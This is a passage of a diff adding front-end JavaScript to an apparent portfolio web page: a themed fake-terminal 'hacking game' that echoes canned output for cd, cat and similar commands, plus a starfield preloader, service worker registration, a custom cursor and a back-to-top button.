+                        line.innerHTML = text;
+                        terminalOutput.appendChild(line);
+                        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        }, delay);
+                        }
+
+                        function processCommand(cmd) {
+                        const command = cmd.toLowerCase().trim();
+
+                        if (command === '') return;
+                        if (cmd.length > 200) { addTerminalLine('<span class="text-red-400">[SEC]</span> Input too long.
+                        Max 200 characters.'); return; }
+
+                        // Track history
+                        commandHistory.push(cmd);
+
+                        addTerminalLine(`<span class="text-green-400">root@kali</span>:<span
+                            class="text-blue-400">${currentDir}</span># ${escapeHTML(cmd)}`);
+
+                        if (command === 'clear') {
+                        terminalOutput.innerHTML = '';
+                        return;
+                        }
+
+                        if (command === 'exit') {
+                        hackingGame.classList.remove('active');
+                        return;
+                        }
+
+                        // Handle 'cd' command
+                        if (command.startsWith('cd ')) {
+                        const target = command.slice(3).trim();
+                        if (target === '~' || target === '') {
+                        currentDir = '/root';
+                        } else if (target === '..') {
+                        const parts = currentDir.split('/').filter(Boolean);
+                        parts.pop();
+                        currentDir = '/' + parts.join('/') || '/root';
+                        } else if (target.startsWith('/')) {
+                        currentDir = fileSystem[target] ? target : currentDir;
+                        if (!fileSystem[target]) { addTerminalLine(`<span class="text-red-400">bash: cd:
+                            ${escapeHTML(target)}: No such file or directory</span>`); return; }
+                        } else {
+                        const newPath = currentDir + '/' + target;
+                        if (fileSystem[newPath]) { currentDir = newPath; }
+                        else { addTerminalLine(`<span class="text-red-400">bash: cd: ${escapeHTML(target)}: No such file
+                            or directory</span>`); return; }
+                        }
+                        return;
+                        }
+
+                        // Handle 'cat' command
+                        if (command.startsWith('cat ')) {
+                        const file = command.slice(4).trim();
+                        const content = fileContents[file] || fileContents[file.replace(/^\.\//, '')];
+                        if (content) {
+                        content.split('\n').forEach((line, i) => { addTerminalLine(line, i * 30); });
+                        } else {
+                        addTerminalLine(`<span class="text-red-400">cat: ${escapeHTML(file)}: No such file or
+                            directory</span>`);
+                        addTerminalLine(`<span class="text-yellow-400">[*] Available files: targets.txt, payload.py,
+                            .bashrc, creds.txt, notes.txt, wordlist.txt</span>`);
+                        addTerminalLine(`<span class="text-yellow-400">[*] System files: /etc/passwd, /etc/shadow,
+                            /etc/hosts</span>`);
+                        }
+                        return;
+                        }
+
+                        // Handle full commands like 'cat /etc/passwd'
+                        const fullCmd = hackingCommands[command];
+                        if (fullCmd) {
+                        const output = typeof fullCmd === 'function' ? fullCmd() : fullCmd;
+                        if (output === 'CD_HANDLER' || output === 'CAT_HANDLER') {
+                        addTerminalLine(`<span class="text-yellow-400">[*] Usage: ${command} [argument]</span>`);
+                        return;
+                        }
+                        output.split('\n').forEach((line, i) => {
+                        addTerminalLine(line, i * 50);
+                        });
+                        return;
+                        }
+
+                        // Partial match for multi-word commands
+                        const keys = Object.keys(hackingCommands);
+                        const match = keys.find(k => command === k);
+                        if (match) {
+                        const output = typeof hackingCommands[match] === 'function' ? hackingCommands[match]() :
+                        hackingCommands[match];
+                        output.split('\n').forEach((line, i) => { addTerminalLine(line, i * 50); });
+                        return;
+                        }
+
+                        addTerminalLine(`<span class="text-red-400">bash: ${escapeHTML(cmd)}: command not
+                            found</span>`);
+                        addTerminalLine(`<span class="text-yellow-400">[*] Type 'help' for all available
+                            commands.</span>`);
+                        }
+
+                        openGame.addEventListener('click', () => {
+                        hackingGame.classList.add('active');
+                        terminalInput.focus();
+                        });
+
+                        closeGame.addEventListener('click', () => {
+                        hackingGame.classList.remove('active');
+                        });
+
+                        terminalInput.addEventListener('keypress', (e) => {
+                        if (e.key === 'Enter') {
+                        processCommand(terminalInput.value);
+                        terminalInput.value = '';
+                        }
+                        });
+
+                        // Close game on Escape key
+                        document.addEventListener('keydown', (e) => {
+                        if (e.key === 'Escape' && hackingGame.classList.contains('active')) {
+                        hackingGame.classList.remove('active');
+                        }
+                        });
+
+                        // ==================== COSMIC GALAXY PRELOADER ====================
+                        (function () {
+                        const preloader = document.getElementById('preloader');
+                        const canvas = document.getElementById('preloader-stars');
+                        const ctx = canvas.getContext('2d');
+
+                        // Star field
+                        function resizeCanvas() {
+                        canvas.width = window.innerWidth;
+                        canvas.height = window.innerHeight;
+                        }
+                        resizeCanvas();
+                        window.addEventListener('resize', resizeCanvas);
+
+                        const stars = [];
+                        for (let i = 0; i < 200; i++) { stars.push({ x: Math.random() * canvas.width, y: Math.random() *
+                            canvas.height, r: Math.random() * 1.5 + 0.3, a: Math.random(), da: (Math.random() - 0.5) *
+                            0.02, dx: (Math.random() - 0.5) * 0.15, dy: (Math.random() - 0.5) * 0.15 }); } let animId;
+                            function drawStars() { ctx.clearRect(0, 0, canvas.width, canvas.height); stars.forEach(s=> {
+                            s.x += s.dx;
+                            s.y += s.dy;
+                            s.a += s.da;
+                            if (s.a > 1 || s.a < 0.1) s.da *=-1; if (s.x < 0) s.x=canvas.width; if (s.x> canvas.width)
+                                s.x = 0;
+                                if (s.y < 0) s.y=canvas.height; if (s.y> canvas.height) s.y = 0;
+                                    ctx.beginPath();
+                                    ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+                                    ctx.fillStyle = `rgba(255,255,255,${s.a})`;
+                                    ctx.fill();
+                                    });
+                                    animId = requestAnimationFrame(drawStars);
+                                    }
+                                    drawStars();
+
+                                    // Hide preloader
+                                    window.addEventListener('load', () => {
+                                    setTimeout(() => {
+                                    preloader.classList.add('hidden');
+                                    setTimeout(() => {
+                                    preloader.style.display = 'none';
+                                    cancelAnimationFrame(animId);
+                                    }, 800);
+                                    }, 4800);
+                                    });
+                                    })();
+
+                                    // ==================== SERVICE WORKER REGISTRATION (PWA) ====================
+                                    if ('serviceWorker' in navigator) {
+                                    window.addEventListener('load', () => {
+                                    navigator.serviceWorker.register('sw.js')
+                                    .then(registration => {
+                                    console.log('✅ Service Worker registered:', registration.scope);
+                                    })
+                                    .catch(error => {
+                                    console.log('❌ Service Worker registration failed:', error);
+                                    });
+                                    });
+                                    }
+
+                                    // ==================== CUSTOM CURSOR ====================
+                                    (function () {
+                                    const cursor = document.getElementById('custom-cursor');
+                                    const trail = document.getElementById('cursor-trail');
+
+                                    if (!cursor || !trail) return;
+
+                                    let mouseX = 0, mouseY = 0;
+                                    let trailX = 0, trailY = 0;
+
+                                    document.addEventListener('mousemove', (e) => {
+                                    mouseX = e.clientX;
+                                    mouseY = e.clientY;
+                                    cursor.style.left = mouseX + 'px';
+                                    cursor.style.top = mouseY + 'px';
+                                    });
+
+                                    // Smooth trail animation
+                                    function animateTrail() {
+                                    trailX += (mouseX - trailX) * 0.15;
+                                    trailY += (mouseY - trailY) * 0.15;
+                                    trail.style.left = trailX + 'px';
+                                    trail.style.top = trailY + 'px';
+                                    requestAnimationFrame(animateTrail);
+                                    }
+                                    animateTrail();
+
+                                    // Hover effect on interactive elements
+                                    const interactiveElements = document.querySelectorAll('a, button, input, textarea,
+                                    select, .glass-card, .project-card, .nav-link');
+                                    interactiveElements.forEach(el => {
+                                    el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
+                                    el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
+                                    });
+
+                                    // Click effect
+                                    document.addEventListener('mousedown', () => cursor.classList.add('click'));
+                                    document.addEventListener('mouseup', () => cursor.classList.remove('click'));
+
+                                    // Hide cursor when leaving window
+                                    document.addEventListener('mouseleave', () => {
+                                    cursor.style.opacity = '0';
+                                    trail.style.opacity = '0';
+                                    });
+                                    document.addEventListener('mouseenter', () => {
+                                    cursor.style.opacity = '1';
+                                    trail.style.opacity = '0.6';
+                                    });
+                                    })();
+
+                                    // ==================== BACK TO TOP BUTTON ====================
+                                    (function () {
+                                    const backToTop = document.getElementById('back-to-top');
+
+                                    if (!backToTop) return;
+
+                                    // Show/hide based on scroll position
+                                    window.addEventListener('scroll', () => {
+                                    if (window.scrollY > 500) {
+                                    backToTop.classList.add('visible');
+                                    } else {
+                                    backToTop.classList.remove('visible');
+                                    }
+                                    });
+
+                                    // Scroll to top on click
+                                    backToTop.addEventListener('click', () => {
+                                    window.scrollTo({
+                                    top: 0,
+                                    behavior: 'smooth'
+                                    });
+                                    });
+                                    })();
+
+                                    </script>
 </body>
 
 </html>
